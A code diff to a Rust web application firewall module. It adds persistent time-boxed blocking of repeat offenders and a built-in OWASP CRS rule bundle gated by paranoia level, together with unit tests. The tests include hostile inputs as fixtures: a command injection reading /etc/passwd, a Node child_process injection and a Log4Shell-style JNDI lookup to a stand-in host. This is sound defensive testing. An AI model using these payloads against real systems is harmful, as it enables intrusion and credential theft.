@@ -10,6 +10,7 @@ use serde::Deserialize;
 use std::sync::Arc;
 
 use super::feed::{FeedRuleAction, WafFeedConfig, WafFeedSubscriber};
+use super::persistent::{PersistentBlockConfig, PersistentBlockStore};
 
 /// Default paranoia level when none is configured. Mirrors the OWASP CRS
 /// convention where 1 is the lowest false-positive setting.
@@ -72,6 +73,19 @@ pub struct WafPolicy {
     /// `Some(_)` and `enabled: true`.
     #[serde(skip)]
     pub feed_subscriber: Option<Arc<WafFeedSubscriber>>,
+    /// Optional persistent, time-boxed block configuration. When present
+    /// and `enabled: true`, clients that trip the WAF repeatedly are
+    /// auto-escalated to a time-boxed block. See [`PersistentBlockConfig`].
+    #[serde(default)]
+    pub persistent_block: Option<PersistentBlockConfig>,
+    /// Live persistent-block state machine. Skipped from serde because it
+    /// owns runtime state (a bounded LRU and an optional shared store
+    /// handle). Populated by [`Self::from_config`] when
+    /// [`Self::persistent_block`] is `Some(_)` and `enabled: true`, then
+    /// optionally upgraded to a shared backend via
+    /// [`Self::with_block_store`].
+    #[serde(skip)]
+    pub block_store: Option<Arc<PersistentBlockStore>>,
 }
 
 /// Result of a WAF check.
@@ -148,7 +162,48 @@ impl WafPolicy {
                 policy.feed_subscriber = Some(sub);
             }
         }
+        if let Some(block_cfg) = policy.persistent_block.clone() {
+            if block_cfg.enabled {
+                policy.block_store = Some(Arc::new(PersistentBlockStore::new(block_cfg)));
+            }
+        }
         Ok(policy)
+    }
+
+    /// Attach a shared L2 store to the persistent-block state machine so
+    /// time-boxed blocks are enforced across replicas. The `origin_id` is
+    /// baked into every key so origins do not share block state.
+    ///
+    /// No-op when persistent blocking is not enabled (`block_store` is
+    /// `None`). When `store` is `None` the local in-process map stays
+    /// authoritative, matching the rate limiter's single-replica path.
+    /// This reuses the existing rate-limit L2 store rather than
+    /// introducing a new backend.
+    pub fn with_block_store(
+        mut self,
+        store: Option<Arc<dyn sbproxy_platform::storage::KVStore>>,
+        origin_id: &str,
+    ) -> Self {
+        if let Some(existing) = self.block_store.take() {
+            // Rebuild the store with the shared backend attached. The
+            // config is the source of truth; the local map is freshly
+            // seeded (a replica restart starts with an empty hot cache and
+            // relies on the shared tier for durable state anyway).
+            if let Some(cfg) = self.persistent_block.clone() {
+                let rebuilt = PersistentBlockStore::new(cfg).with_store(store, origin_id);
+                self.block_store = Some(Arc::new(rebuilt));
+            } else {
+                self.block_store = Some(existing);
+            }
+        }
+        self
+    }
+
+    /// The live persistent-block state machine, if persistent blocking
+    /// is enabled. The enforcer calls [`PersistentBlockStore::is_blocked`]
+    /// up front and [`PersistentBlockStore::record_strike`] after a deny.
+    pub fn block_store(&self) -> Option<&Arc<PersistentBlockStore>> {
+        self.block_store.as_ref()
     }
 
     /// Check whether OWASP CRS is enabled.
@@ -157,6 +212,21 @@ impl WafPolicy {
             Some(v) => v.get("enabled").and_then(|e| e.as_bool()).unwrap_or(false),
             None => false,
         }
+    }
+
+    /// Check whether the shipped OWASP CRS managed bundle is enabled.
+    ///
+    /// Reads `owasp_crs.managed_bundle`. This is the one-flag enable for
+    /// the in-tree CRS corpus (see [`super::bundle`]); it is independent
+    /// of the signed remote feed and of `owasp_crs.enabled` (the built-in
+    /// pattern toggle), so an operator can run the managed bundle with or
+    /// without the legacy built-ins.
+    fn managed_bundle_enabled(&self) -> bool {
+        self.owasp_crs
+            .as_ref()
+            .and_then(|v| v.get("managed_bundle"))
+            .and_then(|e| e.as_bool())
+            .unwrap_or(false)
     }
 
     /// Resolve the effective paranoia level. The top-level `paranoia` field
@@ -232,6 +302,59 @@ impl WafPolicy {
                             return WafResult::Blocked((*block_msg).to_string());
                         }
                     }
+                }
+            }
+        }
+
+        // --- Shipped OWASP CRS managed bundle ---
+        //
+        // The vendored CRS corpus (see `super::bundle`). Enabled with the
+        // single `owasp_crs.managed_bundle: true` flag and gated by the
+        // same `paranoia` level as everything else. Distinct from the
+        // signed remote feed: these rules ship in the binary, so there is
+        // no network fetch and no signature step. The compiled rule set
+        // is shared across policies (compiled once) so this branch only
+        // clones an `Arc` and runs the regexes.
+        if self.managed_bundle_enabled() {
+            let bundle = super::bundle::crs_bundle();
+            let decoded_uri = percent_encoding::percent_decode_str(uri)
+                .decode_utf8_lossy()
+                .replace('+', " ");
+            let header_text: String = headers
+                .iter()
+                .map(|(k, v)| format!("{}: {}", k.as_str(), v.to_str().unwrap_or("")))
+                .collect::<Vec<_>>()
+                .join("\n");
+            let targets = [Some(decoded_uri.as_str()), Some(header_text.as_str()), body];
+
+            for rule in &bundle.rules {
+                if rule.paranoia > paranoia {
+                    continue;
+                }
+                let mut matched = false;
+                for target in targets.into_iter().flatten() {
+                    if rule.regex.is_match(target) {
+                        matched = true;
+                        break;
+                    }
+                }
+                if !matched {
+                    continue;
+                }
+                let log_only =
+                    matches!(rule.action, FeedRuleAction::Log) || action == "log" || self.test_mode;
+                if log_only {
+                    tracing::warn!(
+                        rule_id = rule.id.as_str(),
+                        category = rule.category.as_str(),
+                        paranoia = rule.paranoia,
+                        "WAF CRS bundle: rule matched (log mode)"
+                    );
+                } else {
+                    return WafResult::Blocked(format!(
+                        "WAF OWASP CRS: {} matched [rule {}]",
+                        rule.category, rule.id
+                    ));
                 }
             }
         }
@@ -840,6 +963,106 @@ mod tests {
         assert!(
             matches!(result, WafResult::Clean),
             "paranoia=3 rule must not run at policy paranoia=1"
+        );
+    }
+
+    // --- Shipped OWASP CRS managed bundle ---
+
+    /// The managed bundle enables with one flag and blocks a known
+    /// CRS-flagged payload (here, an RCE command-injection signature
+    /// from the paranoia=1 baseline rules).
+    #[test]
+    fn waf_managed_bundle_blocks_known_payload_with_one_flag() {
+        let policy = WafPolicy::from_config(serde_json::json!({
+            "owasp_crs": { "managed_bundle": true },
+            "action_on_match": "block",
+        }))
+        .unwrap();
+
+        let headers = make_header_map(&[]);
+        // `; cat /etc/passwd` matches the crs-932-100 RCE signature, which
+        // is paranoia=1 (always-on once the bundle is enabled).
+        let result = policy.check_request("/run?cmd=;cat%20/etc/passwd", &headers, None);
+        assert!(
+            matches!(result, WafResult::Blocked(_)),
+            "managed bundle must block a known CRS payload"
+        );
+    }
+
+    /// The managed bundle is off unless the flag is set, even when the
+    /// built-in `owasp_crs.enabled` toggle is present.
+    #[test]
+    fn waf_managed_bundle_disabled_by_default() {
+        let policy = WafPolicy::from_config(serde_json::json!({
+            "owasp_crs": { "enabled": false },
+            "action_on_match": "block",
+        }))
+        .unwrap();
+
+        let headers = make_header_map(&[]);
+        // crs-934-100 (node injection, paranoia=2) signature; without the
+        // managed_bundle flag nothing in the bundle runs.
+        let result = policy.check_request("/api?x=require('child_process')", &headers, None);
+        assert!(
+            matches!(result, WafResult::Clean),
+            "managed bundle rules must not run unless managed_bundle: true"
+        );
+    }
+
+    /// The selectable paranoia level gates the bundle's stricter rules:
+    /// a paranoia>=2 bundle rule does not fire at paranoia=1 but does at 2.
+    #[test]
+    fn waf_managed_bundle_respects_paranoia_level() {
+        // crs-944-100 (Java/Log4Shell-style jndi lookup) is paranoia=2.
+        let payload = "/lookup?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil%7D";
+
+        let low = WafPolicy::from_config(serde_json::json!({
+            "owasp_crs": { "managed_bundle": true, "paranoia_level": 1 },
+            "action_on_match": "block",
+        }))
+        .unwrap();
+        let headers = make_header_map(&[]);
+        assert!(
+            matches!(low.check_request(payload, &headers, None), WafResult::Clean),
+            "paranoia=1 must skip the strict bundle rule"
+        );
+
+        let high = WafPolicy::from_config(serde_json::json!({
+            "owasp_crs": { "managed_bundle": true, "paranoia_level": 2 },
+            "action_on_match": "block",
+        }))
+        .unwrap();
+        assert!(
+            matches!(
+                high.check_request(payload, &headers, None),
+                WafResult::Blocked(_)
+            ),
+            "paranoia=2 must run the strict bundle rule"
+        );
+    }
+
+    // --- Persistent-block plumbing ---
+
+    /// A WAF policy with `persistent_block.enabled: true` builds a live
+    /// block-store; without the block the accessor returns `None`.
+    #[test]
+    fn waf_persistent_block_store_built_when_enabled() {
+        let off = WafPolicy::from_config(serde_json::json!({})).unwrap();
+        assert!(off.block_store().is_none());
+
+        let on = WafPolicy::from_config(serde_json::json!({
+            "persistent_block": {
+                "enabled": true,
+                "strikes": 3,
+                "block_minutes": 5,
+                "track_by": "ip",
+            }
+        }))
+        .unwrap();
+        assert!(on.block_store().is_some());
+        assert_eq!(
+            on.block_store().unwrap().key_kind(),
+            crate::policy::waf::BlockKeyKind::Ip
         );
     }
 
